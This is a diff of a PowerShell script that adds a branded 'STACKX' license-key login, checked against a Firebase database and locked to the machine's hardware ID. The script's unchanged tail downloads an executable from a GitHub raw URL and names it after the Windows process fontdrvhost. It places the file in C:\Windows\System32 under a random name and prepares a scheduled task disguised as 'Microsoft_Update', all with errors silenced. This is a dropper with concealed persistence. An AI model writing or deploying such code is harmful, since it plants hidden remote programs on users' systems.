@@ -1,51 +1,94 @@
 $ErrorActionPreference = "SilentlyContinue"
+[Console]::Title = "STACKX | SECURE AUTHENTICATION"
 
-# --- [ CONFIGURATION ] ---
+# --- [ STACKX CONFIGURATION ] ---
 $DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"
 
+# --- [ SYSTEM FUNCTIONS ] ---
 function Get-HWID {
     return (Get-CimInstance Win32_ComputerSystemProduct).UUID
 }
-# -------------------------
 
-# --- [ LOGIN SYSTEM ] ---
-Clear-Host
-Write-Host "--- SECXION SYSTEM LOGIN ---" -ForegroundColor Yellow
-$key = Read-Host "Enter License Key"
+function Show-Header {
+    $Host.UI.RawUI.BackgroundColor = "Black"
+    Clear-Host
+    Write-Host ""
+    Write-Host "      ███████╗████████╗ █████╗  ██████╗██╗  ██╗██╗  ██╗" -ForegroundColor Magenta
+    Write-Host "      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝╚██╗██╔╝" -ForegroundColor Magenta
+    Write-Host "      ███████╗   ██║   ███████║██║     █████╔╝  ╚███╔╝ " -ForegroundColor White
+    Write-Host "      ╚════██║   ██║   ██╔══██║██║     ██╔═██╗  ██╔██╗ " -ForegroundColor White
+    Write-Host "      ███████║   ██║   ██║  ██║╚██████╗██║  ██╗██╔╝ ██╗" -ForegroundColor DarkGray
+    Write-Host "      ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝" -ForegroundColor DarkGray
+    Write-Host ""
+    Write-Host "         [ STACKX AUTHENTICATION SYSTEM // V2.0 ]      " -ForegroundColor Magenta -BackgroundColor Black
+    Write-Host "  =======================================================" -ForegroundColor DarkGray
+    Write-Host ""
+}
+
+function Write-Console {
+    param (
+        [string]$Message,
+        [string]$Type = "INFO"
+    )
+    
+    switch ($Type) {
+        "INFO"    { Write-Host "  [~] " -NoNewline -ForegroundColor DarkGray; Write-Host $Message -ForegroundColor White }
+        "SUCCESS" { Write-Host "  [+] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -ForegroundColor White }
+        "ERROR"   { Write-Host "  [!] " -NoNewline -ForegroundColor White -BackgroundColor DarkMagenta; Write-Host " $Message " -ForegroundColor White }
+        "INPUT"   { Write-Host "  [>] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -NoNewline -ForegroundColor White }
+    }
+}
+
+# --- [ MAIN INITIALIZATION ] ---
+Show-Header
+
+Write-Console "Initializing secure connection..." "INFO"
+Start-Sleep -Milliseconds 600
+
+Write-Console "Please enter your STACKX License Key: " "INPUT"
+$key = Read-Host ""
 $myHwid = Get-HWID
 
-Write-Host "Connecting to Firebase..." -ForegroundColor Cyan
+Write-Host ""
+Write-Console "Authenticating with STACKX Servers..." "INFO"
+Start-Sleep -Milliseconds 400
 
+# --- [ VERIFICATION PROCESS ] ---
 try {
     $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get
 
     if ($null -eq $data) {
-        Write-Host "Error: Key not found in database!" -ForegroundColor Red
-        Start-Sleep 2 ; exit
-    }
-
-    if ($data.status -ne "active") {
-        Write-Host "Error: This key has been disabled or expired." -ForegroundColor Red
-        Start-Sleep 2 ; exit
-    }
-
-    if ([string]::IsNullOrEmpty($data.hwid)) {
-        $payload = @{ hwid = $myHwid } | ConvertTo-Json
-        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
-        Write-Host "Success: HWID registered to this PC!" -ForegroundColor Green
-    } 
-    elseif ($data.hwid -ne $myHwid) {
-        Write-Host "Error: HWID Mismatch! Key is locked to another PC." -ForegroundColor Red
-        Write-Host "Contact Admin to reset your HWID." -ForegroundColor Gray
+        Write-Console "Authentication Failed: License key does not exist." "ERROR"
         Start-Sleep 3 ; exit
     }
 
-    Write-Host "Access Granted! Welcome." -ForegroundColor Green
-    Start-Sleep 1
+    if ($data.status -ne "active") {
+        Write-Console "Authentication Failed: License is expired or revoked." "ERROR"
+        Start-Sleep 3 ; exit
+    }
+
+    if ([string]::IsNullOrEmpty($data.hwid)) {
+        Write-Console "Binding hardware signature to STACKX Network..." "INFO"
+        $payload = @{ hwid = $myHwid } | ConvertTo-Json
+        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
+        Write-Console "Hardware bound successfully." "SUCCESS"
+    } 
+    elseif ($data.hwid -ne $myHwid) {
+        Write-Console "Security Alert: Hardware ID mismatch detected." "ERROR"
+        Write-Console "This license is strictly locked to another machine." "INFO"
+        Start-Sleep 3 ; exit
+    }
+
+    # --- [ LOGIN SUCCESS ] ---
+    Write-Host ""
+    Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
+    Write-Host ""
+    Write-Host "  Press any key to continue to dashboard..." -ForegroundColor DarkGray
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 } catch {
-    Write-Host "Connection Error! Check your internet or Firebase Rules." -ForegroundColor Red
-    Write-Host $_.Exception.Message -ForegroundColor Gray
+    Write-Console "Network Error: Could not reach STACKX Authentication Servers." "ERROR"
+    Write-Console $_.Exception.Message "INFO"
     Start-Sleep 3 ; exit
 }
 # -------------------------
@@ -57,7 +100,7 @@ $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
 $fileName = "$p_rand$m_rand`_$r_rand.exe"
 $taskName = "Microsoft_Update_$r_rand"
 $destPath = "C:\Windows\System32\$fileName"
-$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhost.exe"
+$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"
 
 while ($true) {
     Clear-Host
